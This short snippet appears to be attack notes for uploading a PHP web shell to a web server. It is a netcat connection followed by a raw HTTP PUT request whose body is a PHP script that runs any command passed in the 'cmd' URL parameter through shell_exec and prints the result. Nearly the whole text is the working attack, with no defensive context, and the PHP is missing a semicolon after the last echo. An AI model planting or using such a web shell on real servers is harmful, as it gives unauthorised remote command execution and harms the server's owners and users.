
nc www.example 80

PUT /payload.php HTTP/1.1 
Content-type: text/html
Content-length: 136  --------> the size of the payload

<?php

if(isset($_GET['cmd'])) {

	$cmd= $_GET['cmd'];
	echo'<pre>';


	$result = shell_exec($cmd);

	echo $result;

	echo '</pre>'
}

?>
